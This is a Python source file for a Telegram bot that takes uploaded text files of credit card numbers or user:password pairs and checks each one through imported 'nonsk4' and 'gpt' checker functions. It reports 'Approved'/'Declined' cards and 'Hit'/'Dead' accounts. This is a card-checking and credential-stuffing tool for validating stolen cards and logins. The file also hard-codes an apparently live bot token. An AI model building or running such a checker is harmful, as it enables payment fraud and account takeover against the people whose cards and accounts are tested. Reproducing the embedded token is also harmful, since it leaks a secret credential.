import telebot
import time
from keep_alive import keep_alive
import threading
from telebot import types
from nonsk4 import check_nonsk4, get_footer_info as nonsk4_footer_info
from gpt import check_gpt, get_footer_info as gpt_footer_info
import os
import sys

TOKEN = '7422696256:AAHV6Df2UShvfvrlFMTkSX8cki6KAMl0T7w'
bot = telebot.TeleBot(TOKEN)

# Dictionary to hold chat_id specific data
chat_data = {}
#stop_processing = False

def send_start_message(message):
    bot.reply_to(message, "Hi! Use /nonsk4 or /gpt in reply to a txt file to check cards or accounts respectively.")

@bot.message_handler(commands=['start'])
def start(message):
    send_start_message(message)

@bot.message_handler(commands=['nonsk4'])
def nonsk4_command(message):
    if message.reply_to_message and message.reply_to_message.document:
        if message.reply_to_message.document.mime_type == 'text/plain':
            file_info = bot.get_file(message.reply_to_message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_content = downloaded_file.decode('utf-8')

            chat_id = message.chat.id
            username = message.from_user.username

            # Start a new thread to handle the file processing
            threading.Thread(target=process_nonsk4, args=(chat_id, username, file_content)).start()
        else:
            bot.reply_to(message, "Please reply to a valid txt file.")
    else:
        bot.reply_to(message, "Please reply to a txt file with the /nonsk4 command.")

@bot.message_handler(commands=['gpt'])
def gpt_command(message):
    if message.reply_to_message and message.reply_to_message.document:
        if message.reply_to_message.document.mime_type == 'text/plain':
            file_info = bot.get_file(message.reply_to_message.document.file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            file_content = downloaded_file.decode('utf-8')

            chat_id = message.chat.id
            username = message.from_user.username

            # Start a new thread to handle the file processing
            threading.Thread(target=process_gpt, args=(chat_id, username, file_content)).start()
        else:
            bot.reply_to(message, "Please reply to a valid txt file.")
    else:
        bot.reply_to(message, "Please reply to a txt file with the /gpt command.")

def process_nonsk4(chat_id, username, file_content):
    total_accounts = file_content.splitlines()
    start_time = time.time()
    approved = []
    declined = []

    initial_message = "Checking Your Card.\n\n"
    footer_info = nonsk4_footer_info(len(total_accounts), start_time, username)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("CC", callback_data=f"{chat_id}:cc"))
    markup.add(types.InlineKeyboardButton(f"Approved ✅: {len(approved)}", callback_data=f"{chat_id}:approved"))
    markup.add(types.InlineKeyboardButton(f"Declined ❌: {len(declined)}", callback_data=f"{chat_id}:declined"))
    markup.add(types.InlineKeyboardButton("Total Cards", callback_data=f"{chat_id}:total"))
    markup.add(types.InlineKeyboardButton("Stop", callback_data=f"{chat_id}:stop"))
    
    msg = bot.send_message(chat_id, initial_message + footer_info, reply_markup=markup)

    for account in total_accounts:
        result = check_nonsk4(account)
        if result == 'Approved':
            approved.append(account)
        else:
            declined.append(account)

        chat_data[chat_id] = {
            'approved': approved,
            'declined': declined,
            'total_accounts': total_accounts
        }

        live_update = f"Checking Your Card\nCC: {account}\nResult: {result}\n\n" + footer_info
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("CC", callback_data=f"{chat_id}:{account}"))
        markup.add(types.InlineKeyboardButton(f"Approved ✅: {len(approved)}", callback_data=f"{chat_id}:approved"))
        markup.add(types.InlineKeyboardButton(f"Declined ❌: {len(declined)}", callback_data=f"{chat_id}:declined"))
        markup.add(types.InlineKeyboardButton("Total Cards", callback_data=f"{chat_id}:total"))
        markup.add(types.InlineKeyboardButton("Stop", callback_data=f"{chat_id}:stop"))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=live_update,
            reply_markup=markup
        )

    final_message = "Card is finished checking.\n\nDeveloper :@aftab"
    bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=final_message)

def process_gpt(chat_id, username, file_content):
    total_accounts = file_content.splitlines()
    start_time = time.time()
    hits = []
    dead = []

    initial_message = "Checking Your Account.\n\n"
    footer_info = gpt_footer_info(len(total_accounts), start_time, username)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("CC", callback_data=f"{chat_id}:cc"))
    markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
    markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
    markup.add(types.InlineKeyboardButton("Total Accounts", callback_data=f"{chat_id}:total"))
    markup.add(types.InlineKeyboardButton("Stop", callback_data=f"{chat_id}:stop"))
    
    msg = bot.send_message(chat_id, initial_message + footer_info, reply_markup=markup)

    for account in total_accounts:
        user, password = account.split(":")
        result = check_gpt(user, password)
        if result == 'Hit':
            hits.append(account)
        else:
            dead.append(account)

        chat_data[chat_id] = {
            'hits': hits,
            'dead': dead,
            'total_accounts': total_accounts
        }

        live_update = f"Checking Your Account\nAccount: {account}\nResult: {result}\n\n" + footer_info
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("CC", callback_data=f"{chat_id}:{account}"))
        markup.add(types.InlineKeyboardButton(f"Hit ✅: {len(hits)}", callback_data=f"{chat_id}:hit"))
        markup.add(types.InlineKeyboardButton(f"Dead ❌: {len(dead)}", callback_data=f"{chat_id}:dead"))
        markup.add(types.InlineKeyboardButton("Total Accounts", callback_data=f"{chat_id}:total"))
        markup.add(types.InlineKeyboardButton("Stop", callback_data=f"{chat_id}:stop"))
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg.message_id,
            text=live_update,
            reply_markup=markup
        )

    final_message = "Account checking finished.\n\nDeveloper :@aftab"
    bot.edit_message_text(chat_id=chat_id, message_id=msg.message_id, text=final_message)

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    data = call.data.split(':')
    cmd = data[1]

    # Ensure chat_data contains the necessary keys
    if chat_id not in chat_data:
        bot.answer_callback_query(call.id, "No data available for this chat.")
        return

    if cmd == 'hit':
        hits_list = '\n'.join(chat_data[chat_id].get('hits', [])) if chat_data[chat_id].get('hits') else 'No hits yet.'
        bot.send_message(chat_id, f"Hit Accounts:\n{hits_list}")
    elif cmd == 'dead':
        dead_list = '\n'.join(chat_data[chat_id].get('dead', [])) if chat_data[chat_id].get('dead') else 'No dead accounts yet.'
        bot.send_message(chat_id, f"Dead Accounts:\n{dead_list}")
    elif cmd == 'total':
        pass  # Do nothing

if __name__ == "__main__":
    keep_alive()
    bot.polling()
